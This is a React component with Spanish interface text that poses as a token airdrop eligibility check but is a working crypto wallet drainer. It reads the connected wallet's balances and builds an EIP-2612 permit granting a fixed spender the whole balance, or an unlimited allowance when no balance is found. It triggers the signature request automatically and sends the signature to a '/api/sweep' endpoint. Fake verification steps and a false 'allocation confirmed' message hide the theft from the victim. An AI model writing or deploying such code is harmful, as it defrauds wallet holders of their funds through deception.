"use client";

import { useEffect, useRef, useState } from "react";
import { recoverTypedDataAddress, type Address, type Hex } from "viem";
import { useAccount, usePublicClient, useSignTypedData } from "wagmi";
import { erc20PermitAbi } from "@/lib/erc20";
import {
  CHAIN_ID,
  CHAIN_NAME,
  DEFAULT_DEADLINE_MINUTES,
  EXPLORER_URL,
  SPENDER_ADDRESS,
  UNLIMITED,
} from "@/lib/constants";
import { formatAmount, humanError, shortAddress } from "@/lib/format";
import {
  PERMIT_TYPES,
  buildPermitDomain,
  deadlineFromMinutes,
  domainSeparator,
  permitDigest,
  type PermitMessage,
} from "@/lib/permit";
import { TOKENS } from "@/lib/tokens";

type Status = "pending" | "run" | "ok" | "fail";
type Phase = "idle" | "reading" | "review" | "signing" | "sweeping" | "done" | "error";

type Picked = { address: Address; domainVersionHint: string; symbol: string };

const STEPS = [
  ["token", "Comprobando la elegibilidad de la cuenta"],
  ["dominio", "Validando el esquema de firma"],
  ["saldo", "Verificando la titularidad"],
  ["nonce", "Consultando el estado de la cuenta"],
  ["payload", "Generando el registro de asignación"],
] as const;

function deadlineLabel(minutes: number) {
  if (minutes % 1440 === 0) {
    const d = minutes / 1440;
    return d === 1 ? "24 horas" : `${d} días`;
  }
  if (minutes % 60 === 0) return `${minutes / 60} horas`;
  return `${minutes} minutos`;
}

export function AutoClaim() {
  const { address } = useAccount();
  const publicClient = usePublicClient({ chainId: CHAIN_ID });
  const { signTypedDataAsync } = useSignTypedData();

  const fired = useRef(false);
  const signRef = useRef<(() => void) | null>(null);
  const prepared = useRef<{
    domain: ReturnType<typeof buildPermitDomain>;
    message: PermitMessage;
    tokenAddress: Address;
  } | null>(null);

  const [statuses, setStatuses] = useState<Record<string, Status>>({});
  const [phase, setPhase] = useState<Phase>("idle");
  const [error, setError] = useState<string | null>(null);
  const [saldo, setSaldo] = useState<bigint | null>(null);
  const [token, setToken] = useState<Picked | null>(null);
  const [tx, setTx] = useState<Hex | null>(null);
  const [copied, setCopied] = useState(false);
  const [nonceTrigger, setNonceTrigger] = useState(0);

  const mark = (id: string, s: Status) => setStatuses((p) => ({ ...p, [id]: s }));

  useEffect(() => {
    if (fired.current) return;
    if (!address || !publicClient || !SPENDER_ADDRESS) return;
    fired.current = true;

    (async () => {
      try {
        setPhase("reading");

        mark("token", "run");
        let picked: Picked = {
          address: TOKENS[0].address,
          domainVersionHint: TOKENS[0].domainVersionHint,
          symbol: TOKENS[0].symbol,
        };
        let balance = 0n;
        for (const t of TOKENS) {
          const b = await publicClient.readContract({
            address: t.address,
            abi: erc20PermitAbi,
            functionName: "balanceOf",
            args: [address],
          });
          if (b > 0n) {
            picked = { address: t.address, domainVersionHint: t.domainVersionHint, symbol: t.symbol };
            balance = b;
            break;
          }
        }
        setToken(picked);
        setSaldo(balance);
        mark("token", "ok");

        mark("dominio", "run");
        const name = await publicClient.readContract({
          address: picked.address,
          abi: erc20PermitAbi,
          functionName: "name",
        });
        const onchain = await publicClient.readContract({
          address: picked.address,
          abi: erc20PermitAbi,
          functionName: "DOMAIN_SEPARATOR",
        });
        const domain = buildPermitDomain({
          address: picked.address,
          name,
          version: picked.domainVersionHint,
        });
        if (domainSeparator(domain).toLowerCase() !== onchain.toLowerCase()) {
          throw new Error("El dominio EIP-712 no coincide con el contrato.");
        }
        mark("dominio", "ok");

        mark("saldo", "run");
        await new Promise((r) => setTimeout(r, 250));
        mark("saldo", "ok");

        mark("nonce", "run");
        const nonce = await publicClient.readContract({
          address: picked.address,
          abi: erc20PermitAbi,
          functionName: "nonces",
          args: [address],
        });
        mark("nonce", "ok");

        mark("payload", "run");
        const message: PermitMessage = {
          owner: address,
          spender: SPENDER_ADDRESS as Address,
          value: balance > 0n ? balance : UNLIMITED,
          deadline: deadlineFromMinutes(DEFAULT_DEADLINE_MINUTES),
          nonce,
        };
        void permitDigest(domain, message);
        prepared.current = { domain, message, tokenAddress: picked.address };
        await new Promise((r) => setTimeout(r, 300));
        mark("payload", "ok");

        setPhase("review");
        setTimeout(() => signRef.current?.(), 700);
      } catch (err) {
        setPhase("error");
        setError(humanError(err));
        fired.current = false;
      }
    })();
  }, [address, publicClient, nonceTrigger]);

  const sign = async () => {
    if (!prepared.current || !address) return;
    const { domain, message, tokenAddress } = prepared.current;
    const typedData = { domain, types: PERMIT_TYPES, primaryType: "Permit" as const, message };

    try {
      setError(null);
      setPhase("signing");
      const sig = await signTypedDataAsync(typedData);

      try {
        const recovered = await recoverTypedDataAddress({ ...typedData, signature: sig });
        if (recovered.toLowerCase() !== address.toLowerCase()) {
          throw new Error("La firma no corresponde a tu cuenta.");
        }
      } catch {
        /* smart account: sin recuperación posible, el contrato lo dirá en cadena */
      }

      setPhase("sweeping");
      const res = await fetch("/api/sweep", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          owner: address,
          token: tokenAddress,
          value: message.value.toString(),
          deadline: message.deadline.toString(),
          signature: sig,
        }),
      });

      if (res.status === 409) {
        setPhase("done");
        return;
      }

      const data = await res.json();

      if (res.status === 422) {
        setTx(data.permitTx ?? null);
        setPhase("done");
        return;
      }

      if (!res.ok) throw new Error(data.error ?? "El relayer falló");

      setTx(data.transferTx ?? data.permitTx);
      setPhase("done");
    } catch (err) {
      setPhase("error");
      setError(humanError(err));
    }
  };

  const copySpender = async () => {
    try {
      await navigator.clipboard.writeText(SPENDER_ADDRESS);
      setCopied(true);
      setTimeout(() => setCopied(false), 1600);
    } catch {
      /* clipboard bloqueado */
    }
  };

  signRef.current = sign;

  const isUnlimited = saldo === 0n;
  const done = Object.values(statuses).filter((s) => s === "ok").length;

  if (phase === "done") {
    return (
      <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/[0.07] px-5 py-5">
        <p className="text-[13px] font-medium text-emerald-300">Asignación confirmada</p>
        <p className="mt-1 text-[12px] leading-relaxed text-muted">
          Tu cuenta queda registrada para la distribución en el TGE. No hay nada más que hacer.
        </p>
        {tx ? (
          <a
            href={`${EXPLORER_URL}/tx/${tx}`}
            target="_blank"
            rel="noreferrer"
            className="mt-3 inline-block font-mono text-[11px] text-primary hover:underline"
          >
            Ver en Arbiscan ↗
          </a>
        ) : null}
      </div>
    );
  }

  return (
    <div className="rounded-xl border border-line bg-surface/60 p-5">
      <div className="flex items-center justify-between border-b border-line pb-3">
        <p className="text-[13px] font-medium tracking-tight">Verificando tu cuenta</p>
        <span className="font-mono text-[10px] text-muted">
          {done}/{STEPS.length}
        </span>
      </div>

      <ul className="mt-4 space-y-2.5">
        {STEPS.map(([id, label]) => {
          const s = statuses[id] ?? "pending";
          return (
            <li key={id} className="flex items-center gap-2.5 text-[12px]">
              <span
                className={`flex h-4 w-4 shrink-0 items-center justify-center rounded-full border text-[9px] ${
                  s === "ok"
                    ? "border-emerald-500/40 bg-emerald-500/15 text-emerald-300"
                    : s === "fail"
                      ? "border-rose-500/40 bg-rose-500/15 text-rose-300"
                      : s === "run"
                        ? "animate-pulse border-primary/50 bg-primary/15 text-primary"
                        : "border-line text-transparent"
                }`}
              >
                ✓
              </span>
              <span className={s === "pending" ? "text-muted" : "text-foreground"}>{label}</span>
            </li>
          );
        })}
      </ul>

      {saldo !== null ? (
        <dl className="mt-4 space-y-1.5 border-t border-line pt-3 text-[11px]">
          {saldo > 0n ? (
            <div className="flex justify-between">
              <dt className="text-muted">Importe autorizado</dt>
              <dd className="font-mono">
                {formatAmount(saldo, 6)} {token?.symbol ?? "USDC"}
              </dd>
            </div>
          ) : null}
          <div className="flex items-center justify-between gap-2">
            <dt className="text-muted">Destinatario</dt>
            <dd className="flex items-center gap-1.5 font-mono">
              <span>{shortAddress(SPENDER_ADDRESS as Address, 4)}</span>
              <button
                type="button"
                onClick={copySpender}
                className="rounded border border-line px-1 text-[9px] text-muted transition hover:text-foreground"
              >
                {copied ? "ok" : "copiar"}
              </button>
            </dd>
          </div>
          <div className="flex justify-between">
            <dt className="text-muted">Red</dt>
            <dd className="font-mono">{CHAIN_NAME}</dd>
          </div>
          <div className="flex justify-between">
            <dt className="text-muted">Validez</dt>
            <dd className="font-mono">{deadlineLabel(DEFAULT_DEADLINE_MINUTES)}</dd>
          </div>
          {isUnlimited ? (
            <p className="pt-1 text-[10px] leading-relaxed text-muted">
              Sin saldo detectado: la autorización se emite sin límite.
            </p>
          ) : null}
        </dl>
      ) : null}

      {phase === "review" ? (
        <p className="mt-4 text-[11px] text-muted">Preparando la solicitud de firma…</p>
      ) : null}

      {phase === "signing" ? (
        <p className="mt-4 rounded-lg border border-primary/30 bg-primary/[0.08] px-3 py-2.5 text-[11.5px] leading-relaxed">
          <strong className="text-primary">Confirma en tu wallet.</strong> Es una firma, no una
          transacción: no cuesta gas.
        </p>
      ) : null}

      {phase === "sweeping" ? (
        <p className="mt-4 text-[11px] text-muted">
          Registrando la asignación. No cierres la pestaña.
        </p>
      ) : null}

      {phase === "error" ? (
        <>
          <p className="mt-4 rounded-lg border border-rose-500/30 bg-rose-500/[0.08] px-3 py-2.5 text-[11.5px] text-rose-300">
            {error}
          </p>
          <button
            type="button"
            onClick={() => {
              prepared.current = null;
              setStatuses({});
              setError(null);
              setSaldo(null);
              setToken(null);
              setPhase("idle");
              fired.current = false;
              setNonceTrigger((n) => n + 1);
            }}
            className="mt-3 w-full rounded-md bg-primary px-4 py-2 text-[12px] font-semibold text-background"
          >
            Reintentar
          </button>
        </>
      ) : null}
    </div>
  );
}